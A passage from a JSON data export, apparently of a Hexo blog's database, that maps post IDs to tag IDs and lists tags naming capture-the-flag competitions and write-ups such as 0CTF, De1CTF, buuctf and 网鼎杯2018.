yo7e8y5h1fpz"},{"post_id":"ck4wcegh50000yo7e74w97qcq","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4wceghl0004yo7e1yp1eqao"},{"post_id":"ck4wg88at0000yk7eghziaddi","tag_id":"ck4wg88b40002yk7ec8s1feoz","_id":"ck4wg88bk0004yk7e91im0wpb"},{"post_id":"ck4wg88at0000yk7eghziaddi","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4wg88bk0005yk7efuk5aevf"},{"post_id":"ck4wg88at0000yk7eghziaddi","tag_id":"ck4wg88bj0003yk7eakalb4dz","_id":"ck4wg88bl0006yk7e1ilzguhg"}],"Tag":[{"name":"ctf","_id":"ck4pc9e4s0004187e0inveyny"},{"name":"buuoj","_id":"ck4pc9e4z0007187ehnnq07s7"},{"name":"web","_id":"ck4pc9e500008187ec9fi3erm"},{"name":"0CTF","_id":"ck4pc9e520009187ef33hfrxm"},{"name":"Roarctf","_id":"ck4pc9e54000d187e4zn56trk"},{"name":"ciscn","_id":"ck4pc9e56000i187e4e8ib1ko"},{"name":"buuctf","_id":"ck4pc9e5a000p187ebctdgelf"},{"name":"De1CTF","_id":"ck4s68npk0001t47edky04y7k"},{"name":"网鼎杯2018","_id":"ck4wceghc0001yo7eav4zhw8a"},{"name":"安恒月赛2020","_id":"ck4wg88b40002yk7ec8s1feoz"},{"name":"wp","_id":"ck4wg88bj0003yk7eakalb4dz"}]}}